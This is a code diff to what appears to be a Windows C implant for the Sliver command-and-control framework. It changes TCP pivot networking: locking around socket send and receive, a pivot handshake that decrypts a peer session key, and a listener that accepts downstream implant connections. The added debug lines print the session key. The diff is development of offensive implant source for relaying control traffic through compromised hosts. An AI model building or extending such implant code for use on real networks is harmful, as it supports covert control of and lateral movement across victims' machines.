@@ -17,7 +17,7 @@ BOOL SocketSend
 	pTemp = ALLOC(cbTemp);
 	memcpy(pTemp, &pBuffer->cbBuffer, sizeof(DWORD));
 	memcpy(pTemp + sizeof(DWORD), pBuffer->pBuffer, pBuffer->cbBuffer);
-	EnterCriticalSection(&pSliverTcpClient->pLock);
+	EnterCriticalSection(pSliverTcpClient->pLock);
 	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
@@ -40,7 +40,7 @@ CLEANUP:
 		goto CLEANUP;
 	}
 
-	LeaveCriticalSection(&pSliverTcpClient->pLock);
+	LeaveCriticalSection(pSliverTcpClient->pLock);
 	FREE(pTemp);
 
 	return Result;
@@ -55,8 +55,9 @@ PBUFFER SocketRecv
 	DWORD dwNumberOfBytesRecv = 0;
 	DWORD dwTotal = 0;
 	DWORD dwZeroTimeout = 0;
+	BOOL IsOk = FALSE;
 
-	EnterCriticalSection(&pSliverTcpClient->pLock);
+	EnterCriticalSection(pSliverTcpClient->pLock);
 	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
@@ -80,13 +81,18 @@ PBUFFER SocketRecv
 		dwTotal += dwNumberOfBytesRecv;
 	}
 
+	IsOk = TRUE;
 CLEANUP:
 	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
 	}
 
-	LeaveCriticalSection(&pSliverTcpClient->pLock);
+	LeaveCriticalSection(pSliverTcpClient->pLock);
+	if (!IsOk) {
+		FreeBuffer(Result);
+		Result = NULL;
+	}
 
 	return Result;
 }
@@ -195,6 +201,8 @@ BOOL TcpStart
 	DWORD i = 0;
 
 	SecureZeroMemory(&Addr, sizeof(Addr));
+	SecureZeroMemory(PivotServerKeyExchange, sizeof(PivotServerKeyExchange));
+	SecureZeroMemory(ServerKeyExResp, sizeof(ServerKeyExResp));
 	inet_pton(AF_INET, pSliverTcpClient->lpHost, &Addr.sin_addr.s_addr);
 	Addr.sin_family = AF_INET;
 	Addr.sin_port = htons(pSliverTcpClient->dwPort);
@@ -205,6 +213,8 @@ BOOL TcpStart
 	}
 
 	pPivotHello = MarshalPivotHello(pConfig, NULL);
+	PrintFormatA("pPivotHello:\n");
+	HexDump(pPivotHello->pBuffer, pPivotHello->cbBuffer);
 	if (!SocketSend(pSliverTcpClient, pPivotHello)) {
 		goto CLEANUP;
 	}
@@ -215,11 +225,17 @@ BOOL TcpStart
 	}
 
 	RecvPivotHello = UnmarshalPivotHello(pPeerPublicKeyRaw);
+	PrintFormatA("RecvPivotHello->pPublicKey: %s\n", RecvPivotHello->pPublicKey->pBuffer);
+	PrintFormatA("RecvPivotHello->lpPublicKeySignature: %s\n", RecvPivotHello->lpPublicKeySignature);
+	PrintFormatA("RecvPivotHello->pSessionKey:\n");
+	HexDump(RecvPivotHello->pSessionKey->pBuffer, RecvPivotHello->pSessionKey->cbBuffer);
 	pPeerSessionKey = AgeDecryptFromPeer(pConfig, RecvPivotHello->pPublicKey, RecvPivotHello->lpPublicKeySignature, RecvPivotHello->pSessionKey);
 	if (pPeerSessionKey == NULL || pPeerSessionKey->cbBuffer != CHACHA20_KEY_SIZE) {
 		goto CLEANUP;
 	}
 
+	PrintFormatA("pPeerSessionKey->pBuffer:\n");
+	HexDump(pPeerSessionKey->pBuffer, pPeerSessionKey->cbBuffer);
 	pConfig->pPeerSessionKey = pPeerSessionKey->pBuffer;
 	pPeerSessionKey->pBuffer = NULL;
 
@@ -441,6 +457,8 @@ PPIVOT_CONNECTION TcpAccept
 	pTcpClient->dwReadDeadline = 10;
 	pTcpClient->dwWriteDeadline = 10;
 	pTcpClient->Sock = ClientSocket;
+	pTcpClient->pLock = ALLOC(sizeof(CRITICAL_SECTION));
+	InitializeCriticalSection(pTcpClient->pLock);
 	pResult->lpDownstreamConn = pTcpClient;
 	pResult->pListener = pListener;
 CLEANUP:
@@ -464,7 +482,7 @@ PPIVOT_LISTENER CreateTCPPivotListener
 	ULONG uScopeId = 0;
 	USHORT uPort = 0;
 	SOCKET Sock = INVALID_SOCKET;
-	ULONG IoBlock = 1;
+	ULONG IoBlock = 0;
 	DWORD dwErrorCode = 0;
 	BOOL IsOk = FALSE;
 	WSADATA WsaData;
@@ -481,7 +499,7 @@ PPIVOT_LISTENER CreateTCPPivotListener
 	Status = RtlIpv6StringToAddressExA(lpBindAddress, &In6Addr, &uScopeId, &uPort);
 	if (Status == STATUS_SUCCESS) {
 		memcpy(&SockAddr6.sin6_addr, &In6Addr, sizeof(In6Addr));
-		SockAddr6.sin6_port = htons(uPort);
+		SockAddr6.sin6_port = uPort;
 		SockAddr6.sin6_family = AF_INET6;
 		SockAddr6.sin6_scope_id = uScopeId;
 		UseIpv4 = FALSE;
@@ -490,7 +508,7 @@ PPIVOT_LISTENER CreateTCPPivotListener
 		Status = RtlIpv4StringToAddressExA(lpBindAddress, TRUE, &InAddr, &uPort);
 		if (Status == STATUS_SUCCESS) {
 			SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
-			SockAddr.sin_port = htons(uPort);
+			SockAddr.sin_port = uPort;
 			SockAddr.sin_family = AF_INET;
 		}
 		else {
@@ -525,6 +543,11 @@ PPIVOT_LISTENER CreateTCPPivotListener
 
 	if (dwErrorCode != NO_ERROR) {
 		LOG_ERROR("bind", WSAGetLastError());
+		goto CLEANUP;
+	}
+
+	if (listen(Sock, SOMAXCONN) != NO_ERROR) {
+		LOG_ERROR("listen", WSAGetLastError());
 		goto CLEANUP;
 	}
 
